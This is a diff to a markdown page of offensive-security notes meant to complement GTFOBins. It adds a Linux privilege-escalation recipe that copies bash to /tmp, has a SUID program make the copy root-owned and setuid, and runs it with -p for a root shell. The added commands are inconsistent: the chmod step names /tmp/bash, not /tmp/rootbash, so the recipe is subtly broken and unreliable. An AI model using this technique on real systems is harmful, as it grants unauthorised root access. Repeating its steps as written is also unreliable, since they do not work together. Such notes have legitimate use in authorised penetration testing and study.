@@ -2,11 +2,40 @@
 
 Some scripts, utilities, notes... complementary to GTFOBins.
 
-<hr class="sl">
+<hr class="sep-both">
+
+## ⚡ Create a bash from a suid program
+
+<div class="row row-cols-md-2 mt-3"><div>
+
+* ➡️ Version 1 : create a SUID file
+
+```bash
+$ cp /bin/bash /tmp/rootbash
+```
+
+Make the SUID program run the following commands.
+
+```bash
+$ chown root /tmp/rootbash
+$ chmod +s /tmp/bash
+```
+
+Run the bash with `-p` and enjoy.
+
+```bash
+$ /tmp/rootbash -p
+```
+</div><div>
+
+...
+</div></div>
+
+<hr class="sep-both">
 
 ## ⚡ SUID `systemctl` script
 
-Description: this script make it easier to run several commands using `systemctl`. Alternatively, you can create a bash with the SUID bit.
+Description: this script make it easier to run several commands using `systemctl`.
 
 <div class="row row-cols-md-2 mt-4"><div>
 
